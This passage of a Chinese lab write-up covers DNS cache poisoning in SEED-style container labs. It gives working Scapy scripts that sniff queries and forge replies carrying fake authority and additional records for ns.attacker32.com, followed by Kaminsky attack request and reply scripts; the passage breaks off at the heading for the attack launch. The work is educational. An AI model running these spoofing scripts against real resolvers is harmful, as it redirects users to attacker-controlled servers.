pkt[IP].dst)</span><br><span class="line">udp = UDP (dport = pkt[UDP].sport, sport = <span class="number">53</span>)</span><br><span class="line"><span class="comment"># 构造ANSWER SECTION</span></span><br><span class="line">Anssec = DNSRR( rrname = pkt[DNS].qd.qname,  <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">                rdata  = <span class="string">&#x27;1.2.3.4&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line"><span class="comment"># 构造nameserver服务器相关信息</span></span><br><span class="line">NSsec  = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line">NSsec1 = DNSRR( rrname = <span class="string">&#x27;google.com&#x27;</span>, </span><br><span class="line">                    <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                    rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                    ttl    = <span class="number">259200</span>)             </span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">              qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">              ancount=<span class="number">1</span>, an = Anssec, </span><br><span class="line">              nscount=<span class="number">2</span>, ns = NSsec/NSsec1)</span><br><span class="line"></span><br><span class="line">spoofpkt = ip/udp/dns</span><br><span class="line">send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#f = &#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">f = <span class="string">&#x27;udp and dst port 53&#x27;</span></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p>以root权限运行此嗅探程序，同时在user container中运行dig命令，发送DNS query，结果显示的是Anssec里构造的ip<code>1.2.3.4</code>；user container中收到的消息显示伪造的DNS reply包中的Authority section部分是有刚才添加的google.com域的nameserver相关信息的。</p><p>在本地的dns容器内查看dns缓存，example.com域名的权威服务器被改为攻击dns服务器了，即DNS欺骗包只保留了一条，没有google.com域的nameserver信息，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 21.43.21.png" alt="截屏2025-01-05 21.43.21" style="zoom:33%;" /><p>说明本地的DNS服务器不会接收这个多余的Authority section，</p><p><strong>思考一</strong>：</p><blockquote><p>交换<code>NSsec1</code>和<code>NSsec</code>的顺序，结果会怎么样？</p></blockquote><p>如果仅仅交换<code>NSsec1</code>和<code>NSsec</code>的顺序，则结果会不一样，结果如下，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">    qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">    ancount=<span class="number">1</span>, an = Anssec, </span><br><span class="line">    nscount=<span class="number">2</span>, ns = NSsec1/NSsec)</span><br></pre></td></tr></table></figure><p>以root权限运行此嗅探程序，同时在user container中运行dig命令，发送DNS query，结果显示的也是Anssec里构造的ip<code>1.2.3.4</code>。</p><p>在本地的dns容器内查看dns缓存，google.com域名的权威服务器被改为攻击dns服务器了，即DNS欺骗包只保留了一条，没有example.com域的nameserver信息，</p><p>此时如果<code>dig xxx.google.com</code>，那么不会再像没缓存的时候返回正确的值，而是会返回空A值，因为ns.attacker32.com中对于只有自己的和example.com的nameserver，</p><p>**<u><em>这个条件下，Authority Section中的NS顺序会影响本地dns的缓存。</em></u>**</p><p><strong>思考二</strong>：</p><blockquote><p>修改NS_NAME（包的判定条件）会对结果有影响吗？</p></blockquote><p>如果修改NS_NAME（包的判定条件）<code>example.com</code>为<code>www.example.com</code>，那么不论<code>NSsec1</code>和<code>NSsec</code>的顺序如何，在本地的dns容器内查看dns缓存，example.com域名的权威服务器被改为攻击dns服务器了，即DNS欺骗包只保留了一条，没有google.com域的nameserver信息，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):<span class="comment"># 判断是否为查询example.com的DNS请求</span></span><br><span class="line">ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)</span><br><span class="line">udp = UDP (dport = pkt[UDP].sport, sport = <span class="number">53</span>)</span><br><span class="line"><span class="comment"># 构造ANSWER SECTION</span></span><br><span class="line">Anssec = DNSRR( rrname = pkt[DNS].qd.qname,  <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">                rdata  = <span class="string">&#x27;1.2.3.4&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line"><span class="comment"># 构造nameserver服务器相关信息</span></span><br><span class="line">NSsec  = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line">NSsec1 = DNSRR( rrname = <span class="string">&#x27;google.com&#x27;</span>, </span><br><span class="line">                    <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                    rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                    ttl    = <span class="number">259200</span>)             </span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">    qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">    ancount=<span class="number">1</span>, an = Anssec, </span><br><span class="line">    nscount=<span class="number">2</span>, ns = NSsec1/NSsec)</span><br><span class="line">    <span class="comment"># dns = DNS( id = pkt[DNS].id, aa=1, rd=0, qr=1,           </span></span><br><span class="line"><span class="comment">#     qdcount=1, qd = pkt[DNS].qd,                 </span></span><br><span class="line"><span class="comment">#     ancount=1, an = Anssec, </span></span><br><span class="line"><span class="comment">#     nscount=2, ns = NSsec/NSsec1)</span></span><br><span class="line"></span><br><span class="line">spoofpkt = ip/udp/dns</span><br><span class="line">send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#f = &#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">f = <span class="string">&#x27;udp and dst port 53&#x27;</span></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p>结果如下，</p><p><code>NSsec1</code>在前，或者<code>NSsec1</code>在后，这两种情况的本地dns缓存结果是一模一样的，只保留了<code>example.com</code>。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 21.42.03.png" alt="截屏2025-01-05 21.42.03" style="zoom:33%;" /><p>所以，<strong><u><em>DNS服务器并不是始终缓存Authority Section中的第一个NS</em></u></strong>；猜测Authority Section中的项被存入缓存的条件可能是为：<strong><u><em>NS的网域必须包含查询的子域名</em></u></strong></p><p><strong>思考三</strong>：</p><blockquote><p>是不是只能接受Authority Section中的第一个项呢？</p></blockquote><p>如果修改NSsec的rrname<code>google.com</code>为<code>example.com</code>，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):<span class="comment"># 判断是否为查询example.com的DNS请求</span></span><br><span class="line">ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)</span><br><span class="line">udp = UDP (dport = pkt[UDP].sport, sport = <span class="number">53</span>)</span><br><span class="line"><span class="comment"># 构造ANSWER SECTION</span></span><br><span class="line">Anssec = DNSRR( rrname = pkt[DNS].qd.qname,  <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">                rdata  = <span class="string">&#x27;1.2.3.4&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line"><span class="comment"># 构造nameserver服务器相关信息</span></span><br><span class="line">NSsec  = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line">NSsec1 = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                    <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                    rdata  = <span class="string">&#x27;ns.attacker33.com&#x27;</span>,</span><br><span class="line">                    ttl    = <span class="number">259200</span>)             </span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">    qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">    ancount=<span class="number">1</span>, an = Anssec, </span><br><span class="line">    nscount=<span class="number">2</span>, ns = NSsec1/NSsec)</span><br><span class="line"></span><br><span class="line">spoofpkt = ip/udp/dns</span><br><span class="line">send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#f = &#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">f = <span class="string">&#x27;udp and dst port 53&#x27;</span></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p>结果如下，在缓存中发现这两项都被存入了缓存，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 21.41.48.png" alt="截屏2025-01-05 21.41.48" style="zoom:33%;" /><p><strong>思考四</strong>：</p><blockquote><p>NS_NAME设为<code>www.example.com</code>不一样的是，把NS记录<code>google.com</code>改为<code>google.example.com</code>，结果如何？</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">NSsec  = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line">NSsec1 = DNSRR( rrname = <span class="string">&#x27;google.example.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker33.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)  </span><br></pre></td></tr></table></figure><p>发现成功录入cache，结果如下，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 21.41.35.png" alt="截屏2025-01-05 21.41.35" style="zoom:33%;" /><p>也就是说只会缓存一个域名的NS记录，存在覆盖情况。</p><h4 id="Task5-Spoofing-Records-in-the-Additional-Section"><a href="#Task5-Spoofing-Records-in-the-Additional-Section" class="headerlink" title="Task5. Spoofing Records in the Additional Section"></a>Task5. Spoofing Records in the Additional Section</h4><p>在DNS reply中，还有一个Additional Section，这是用于提供附加信息的。在实践中，它主要用于为某些hostname提供IP地址，特别是哪些出现在Authority section中的hostname。</p><p>本次task的目标就是伪造Additional Section中的项，查看它们是否被成功缓存到本地的DNS服务器中。</p><p><strong>实验步骤：</strong></p><p>先清除本地DNS服务器的缓存，</p><p>然后修改代码，在Additional Section中添加三个项；其中，第一条和第二条都与Authority Section中的hostname相关，第三条与reply中的hostname都没有关系。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):<span class="comment"># 判断是否为查询example.com的DNS请求</span></span><br><span class="line">ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)</span><br><span class="line">udp = UDP (dport = pkt[UDP].sport, sport = <span class="number">53</span>)</span><br><span class="line"><span class="comment"># 构造ANSWER SECTION</span></span><br><span class="line">Anssec = DNSRR( rrname = pkt[DNS].qd.qname, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">                rdata  = <span class="string">&#x27;1.2.3.50&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line"><span class="comment"># 构造nameserver服务器相关信息</span></span><br><span class="line">NSsec  = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line">NSsec1 = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                    <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                    rdata  = <span class="string">&#x27;ns.example.com&#x27;</span>,</span><br><span class="line">                    ttl    = <span class="number">259200</span>) </span><br><span class="line">Addsec1 = DNSRR(rrname = <span class="string">&#x27;ns.attack32.com&#x27;</span>,</span><br><span class="line">                    <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                    rdata = <span class="string">&#x27;1.2.3.4&#x27;</span>,</span><br><span class="line">                    ttl = <span class="number">259200</span>) </span><br><span class="line">Addsec2 = DNSRR(rrname = <span class="string">&#x27;ns.example.net&#x27;</span>,</span><br><span class="line">                    <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                    rdata = <span class="string">&#x27;5.6.7.8&#x27;</span>,</span><br><span class="line">                    ttl = <span class="number">259200</span>)</span><br><span class="line">Addsec3 = DNSRR(rrname = <span class="string">&#x27;www.facebook.com&#x27;</span>,</span><br><span class="line">                    <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                    rdata = <span class="string">&#x27;3.4.5.6&#x27;</span>,</span><br><span class="line">                    ttl = <span class="number">259200</span>)          </span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">    qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">    ancount=<span class="number">1</span>, an = Anssec, </span><br><span class="line">    nscount=<span class="number">2</span>, ns = NSsec1/NSsec,</span><br><span class="line">    arcount=<span class="number">3</span>, ar = Addsec1/Addsec2/Addsec3)</span><br><span class="line"></span><br><span class="line">spoofpkt = ip/udp/dns</span><br><span class="line">send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#f = &#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">f = <span class="string">&#x27;udp and dst port 53&#x27;</span></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p>以root权限运行该py程序，同时在user container中使用dig命令发送DNS query；在user container中dig命令返回的消息中，可以看见Addition Section中的这三个项，</p><p>然后查看本地DNS服务器的缓存，</p><p>只发现Authority Section中的两项被缓存了，Additional Section中的三项都没有被缓存，</p><p><strong>为什么？</strong></p><p>因为DNS服务器只存和Authority Section里的域名有关的IP。</p><p><code>NSsec.rdata = Addsec.rrname</code></p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 21.56.27.png" alt="截屏2025-01-05 21.56.27" style="zoom:33%;" /><p>但是把Additional Section项再做修改，修改如下，即可产生对比，</p><ul><li><p>第二项中的<code>rrname=ns.example.com</code>，与Authority Section中的第二项的rrdata相同；</p></li><li><p>第三项改为Authority Section中的rrname的子域；</p></li><li><p>修改NS_NAME（包的判定条件）为<code>www.example.com</code></p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Addsec1 = DNSRR(rrname = <span class="string">&#x27;ns.attack32.com&#x27;</span>,</span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    rdata = <span class="string">&#x27;1.2.3.4&#x27;</span>,</span><br><span class="line">    ttl = <span class="number">259200</span>) </span><br><span class="line">Addsec2 = DNSRR(rrname = <span class="string">&#x27;ns.example.com&#x27;</span>,</span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    rdata = <span class="string">&#x27;5.6.7.8&#x27;</span>,</span><br><span class="line">    ttl = <span class="number">259200</span>)</span><br><span class="line">Addsec3 = DNSRR(rrname = <span class="string">&#x27;mail.example.com&#x27;</span>,</span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    rdata = <span class="string">&#x27;3.4.5.6&#x27;</span>,</span><br><span class="line">    ttl = <span class="number">259200</span>)          </span><br></pre></td></tr></table></figure><p>再重新攻击测试，重新查看本地DNS的缓存；发现Additional Section中的第二项被存入了缓存，</p><p>应该是Additional Section中的项，只有与Authority Section中的域名(rdata)相同才能被存入缓存，而且如果Authority Section中的域名如果已经有解析的IP地址(例如<code>ns.attacker32.com</code>被写入了配置文件)，那么与之相关的Additional Section也不会被存入缓存。</p><p>如果缓存机制中没有针对Additional Section中的项作限制，那么会使得攻击者一次性注入很多恶意的信息。所以，这样是比较合理的。</p><blockquote><p>这是因为在 DNS 中，超出域的附加记录是指在 DNS 查询中包含的与请求的域不相关的额外记录。通常，DNS 查询只应包含与请求的域相关的记录，例如域名的主机记录（A 记录）、邮件交换记录（MX 记录）等。超出域的附加记录(Out-of-zone Additional Records)指的就是DNS响应中返回的一些不属于当前查询域名区的额外记录。</p><p>与普通附加记录的区别是:</p><ul><li>普通附加记录都是与查询域相关的记录,如域名的NS、MX等记录。</li><li>超出域附加记录是不属于当前查询域名区的其他记录,如父域名或子域名的记录等。</li></ul><p>一些常见的超出域附加记录类型包括:</p><ul><li>父域名的NS记录:查询子域时返回父域的NS记录</li><li>子域名的NS记录:查询父域时返回子域的NS记录</li><li>nameserver所在区域的SOA记录:返回nameserver权威区域的SOA记录</li></ul><p>当 DNS 服务器收到一个查询请求时，它通常只会关注与请求的域相关的记录，并且会忽略超出域的附加记录。这意味着超出域的附加记录不会被处理，也不会返回给查询的客户端。DNS 服务器的这种行为是为了提高查询效率和安全性。如果 DNS 服务器处理超出域的附加记录，并将其返回给查询的客户端，那么恶意用户可能会滥用这些记录来进行攻击，例如进行 DNS 劫持、欺骗等。</p><p>而task4能成功的原因是因为task4并非附加记录而是authauthority。</p></blockquote><h2 id="The-Kaminsky-Attack-Lab"><a href="#The-Kaminsky-Attack-Lab" class="headerlink" title="The Kaminsky Attack Lab"></a>The Kaminsky Attack Lab</h2><p>与Local DNS Attack实验不同的是，本次实验中将无法使用嗅探技术，所以攻击将会变得困难许多。</p><h3 id="The-Attack-Tasks-1"><a href="#The-Attack-Tasks-1" class="headerlink" title="The Attack Tasks"></a>The Attack Tasks</h3><p>本次攻击的目标是对本地DNS服务区发起DNS cache poisoning攻击，使得当用户尝试使用dig命令的到<code>www.example.com</code>的IP地址的时候，本地的DNS服务器会去询问攻击者的nameserver，<code>ns.attacker32.com</code>而不是去询问官方的nameserver。</p><p>这样，攻击者就可以修改返回的IP地址，使得用户被访问到攻击者设计的网站，而不是真正的<code>www.example.com</code>，</p><p>一个完整的DNS查询过程（迭代查询）如下图：</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 22.03.49.png" alt="截屏2025-01-05 22.03.49" style="zoom:33%;" /><h4 id="Task1-How-Kaminsky-Attack-Works"><a href="#Task1-How-Kaminsky-Attack-Works" class="headerlink" title="Task1. How Kaminsky Attack Works"></a>Task1. How Kaminsky Attack Works</h4><p>在该实验中，攻击者向受害者DNS服务器（Apollo）发送DNS查询请求，从而触发Apollo的DNS查询。查询可以通过一个root DNS服务器，<code>.COM</code>的DNS服务器，最终结果将从example.com的DNS服务器返回。如上图所示。如果example.com的nameserver信息已经被Apollo缓存，那么查询将不会通过root或.COM服务器。</p><p>当Apollo等待example.com nameserver的DNS reply时，攻击者可以向Apollo发送伪造的reply，假装这些reply来自example.com的nameserver。如果这些伪造的reply比真正的reply先到达，那么Apollo就会接收这个伪造的reply，攻击就算成功。</p><p>但是在本次实验中，攻击者将无法嗅探，无法获得数据包的信息。所以较于Local DNS Attack，本次实验的难度主要是由于<strong>DNS reply数据包中的事务ID必须与query数据包中的ID匹配</strong>。由于query中的事务ID通常是随机生成的，在无法查看数据包的情况下，攻击者不容易获得正确的ID。**<u>（<em>需要猜测查询主机的端口号和事务</em>ID）</u>**</p><p>但是，攻击者可以**<u><em>通过猜测的方式</em></u>**来获得正确的事务ID，毕竟ID的大小只有16位，只要攻击者在攻击窗口（合法的response抵达之前）内伪造K个response，那么成功的概率就为<code>K/2^16</code>。在这攻击窗口期间发送几百个数据包并不是不切实际的，所以攻击者只需要几次尝试就可以成功。</p><p>然而，上述假设的攻击没有考虑到cache。事实上，如果攻击者没有足够的运气在合法的response抵达之前做出正确的猜测，那么正确的信息将会被DNS服务器缓存一段时间。cache机制使得攻击者无法伪造关于同一hostname的另一个响应，因为在cache超时之前，本地DNS服务器不会再发送此hostname的另一个DNS query，这意味着攻击者必须等待cache超时。</p><p><strong>The Kaminsky Attack</strong></p><p>Dan Kaminsky提出了一个非常优雅的技术来克服cache效应。通过Kaminsky攻击，攻击者将能够连续攻击域名上的DNS服务器，而无需等待，因此攻击可以在很短的时间内成功。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 22.18.48.png" alt="截屏2025-01-05 22.18.48" style="zoom:33%;" /><p>如图所示：</p><ol><li>攻击者向DNS服务器Apollo查询一个example.com域下的一个不存在的子域名，例如twysw.example.com。</li><li>由于Apollo无法在缓存中找到对应的信息，所以它会发送一个DNS query到example.com DNS服务器。</li><li>当Apollo等待reply时，攻击者向Apollo大量发送伪造的DNS响应，每个响应都尝试不同的事务ID，希望其中一个是正确的。在响应中，攻击者不仅为twysw.example.com提供了IP解析，还提供了“权威名称服务器”记录，指示ns.attacker32.com为example.com域的名称服务器。如果伪造的reply数据包事务ID刚好正确，而且又比官方的reply更早抵达，那么Apollo就会接受这个数据包并且将它写入缓存，此时Apollo的DNS缓存就被污染了。</li><li>即使伪造的DNS reply失败（例如，事务ID不匹配或抵达太晚），也没关系，因为下次攻击者会查询不同的名称，因此Apollo必须发出另一个查询，给攻击者另一次进行伪造攻击的机会。</li><li>如果攻击成功，在Apollo的DNS缓存中，example.com的名称服务器将被攻击者的名称服务器ns.attacker32.com取代。</li></ol><h4 id="Task2-Construct-DNS-request"><a href="#Task2-Construct-DNS-request" class="headerlink" title="Task2.  Construct DNS request"></a>Task2.  <strong>Construct DNS request</strong></h4><p>此任务的重点是发送DNS request。为了完成攻击，攻击者需要触发目标DNS服务器发送DNS query，这样他们就有机会伪造DNS response。由于攻击者需要尝试多次才能成功，因此最好使用程序自动执行该过程。</p><p>发送DNS request的频率要求不高，所以使用C或者Python语言均可。</p><p><strong>实验步骤：</strong></p><p>编写程序，实现DNS request包的发送，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">Qdsec = DNSQR(qname=<span class="string">&#x27;aaaaa.example.com&#x27;</span>)</span><br><span class="line">dns = DNS(<span class="built_in">id</span>=<span class="number">0xAAAA</span>, qr=<span class="number">0</span>, qdcount=<span class="number">1</span>, ancount=<span class="number">0</span>, nscount=<span class="number">0</span>, arcount=<span class="number">0</span>, qd=Qdsec)</span><br><span class="line">ip = IP(dst=<span class="string">&#x27;10.9.0.53&#x27;</span>, src=<span class="string">&#x27;10.9.0.1&#x27;</span>)</span><br><span class="line">udp = UDP(dport=<span class="number">53</span>, sport=<span class="number">33333</span>, chksum=<span class="number">0</span>)</span><br><span class="line">request = ip/udp/dns</span><br><span class="line">request.show()</span><br><span class="line">send(request)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_req.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(request))</span><br></pre></td></tr></table></figure><h4 id="Task3-Spoof-DNS-Replies"><a href="#Task3-Spoof-DNS-Replies" class="headerlink" title="Task3. Spoof DNS Replies"></a>Task3. Spoof DNS Replies</h4><p>在这个task中，我们需要在Kaminsky攻击中伪造DNS reply。由于我们的目标是example.com，所以我们需要伪造来自该域名服务器的回复。</p><p>可以使用python中的scapy库来完成该任务。</p><p><strong>实验步骤：</strong></p><p>编写程序，实现发送伪造的DNS response，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">name = <span class="string">&#x27;aaaaa.example.com&#x27;</span></span><br><span class="line">domain = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line">ns = <span class="string">&#x27;ns.attacker32.com&#x27;</span></span><br><span class="line"></span><br><span class="line">Qdsec = DNSQR(qname=name)</span><br><span class="line">Ansec = DNSRR(rrname=name, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>, ttl=<span class="number">259200</span>)</span><br><span class="line"><span class="comment"># AuthoritySection rrname为查询的域名 rdata为该域名对应的DNS权威服务器，设为attacker ns</span></span><br><span class="line">NSsec = DNSRR(rrname=domain, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, rdata=ns, ttl=<span class="number">259200</span>)</span><br><span class="line"></span><br><span class="line">dns = DNS(<span class="built_in">id</span>=<span class="number">0xAAAA</span>, aa=<span class="number">1</span>, rd=<span class="number">1</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, arcount=<span class="number">0</span>, qd=Qdsec, an=Ansec, ns=NSsec)</span><br><span class="line">ip = IP(dst=<span class="string">&#x27;10.9.0.53&#x27;</span>, src=<span class="string">&#x27;199.43.133.53&#x27;</span>)</span><br><span class="line">udp = UDP(dport=<span class="number">33333</span>, sport=<span class="number">53</span>,chksum=<span class="number">0</span>)</span><br><span class="line">reply = ip/udp/dns</span><br><span class="line">send(reply)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a packet has been sent!\n&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_resp.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(reply))</span><br></pre></td></tr></table></figure><p>要注意端口号和Answer Section和Authority Section（在这里实现污染）的值，</p><p>使用root权限执行该程序，同时使用wireshark进行抓包，成功抓包，信息表明这就是我们发送的伪造的DNS response，因为没有与之对应的DNS request，所以该数据包不会有任何作用。</p><h4 id="Task4-Launch-the-Kaminsky-Attack"><a href="#Task4-Launch-the-Kaminsky-Attack" class="headerlink" title="Task4. Launch the Kaminsky Attack"></a>Task4. Launch the Kaminsky 